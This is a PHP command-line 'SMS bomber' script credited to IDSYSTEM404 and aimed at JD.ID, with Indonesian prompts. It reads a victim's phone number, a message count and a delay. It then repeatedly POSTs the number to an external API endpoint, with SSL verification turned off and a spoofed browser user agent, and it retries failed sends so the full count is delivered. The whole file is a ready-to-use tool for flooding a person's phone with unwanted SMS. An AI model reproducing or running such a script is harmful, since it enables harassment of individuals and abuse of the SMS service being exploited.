<?php
error_reporting(0);
/**
# Copyright (c) 2018 IDSYSTEM404.
# thanks to IDSYSTEM404.
**/
echo "\n\e[1;35m============================[ BOM SMS JD.ID ]==========================\e[0m\r\n";
$banner     = "   
\e[1;35m=====================================================================
Feature :
- Add input delay time.
\e[1;35m=====================================================================\e[0m\n";

print $banner;
sleep(1);

$authorceo = 'IDSYSTEM404 | BOM SMS JD.ID';

echo "\nNomor : ";
$no = trim(fgets(STDIN, 1024)); 
echo "\nJumlah : ";
$jumlah = trim(fgets(STDIN, 1024));
echo "\nJeda : ";
$delay = rtrim( fgets( STDIN));

echo "\n\e[1;35m+=========================\e[0m[# \e[1;32mPROSES\e[0m #]\e[1;35m=========================+\e[0m\n";

for ($x=1; $x<=$jumlah; $x++) {

/** FUNCTION CURL **/
$idsystem404 = curl_init();$idsystem404 = curl_init();
        curl_setopt($idsystem404, CURLOPT_URL,"https://api.petaniilmu.com/api/api-bomsmsjdid.php?bomsms=".$no);
        curl_setopt($idsystem404, CURLOPT_POST, 1);
        curl_setopt($idsystem404, CURLOPT_POSTFIELDS, 1);
        curl_setopt($idsystem404, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($idsystem404, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($idsystem404, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($idsystem404, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($idsystem404, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
$exec = curl_exec($idsystem404);
if(!curl_errno($idsystem404)){
$info = curl_getinfo($idsystem404);
curl_close($idsystem404);
	if ($exec == "error") {
		$jumlah += 1;
		echo "\n\e[1;31mERROR : Silahkan Periksa Koneksi Internet atau Isi Isian diatas dengan Benar!\e[0m\n";
		flush();
		sleep($delay); /** Delay **/		
	} else {
		echo "$x. [\e[1;31m $authorceo \e[0m] | Nomor : [\e[1;34m $no \e[0m] [ \e[1;92mSUCCESS ]\e[0m\n";
		flush();
		sleep($delay); /** Delay **/
	}
}
}
?>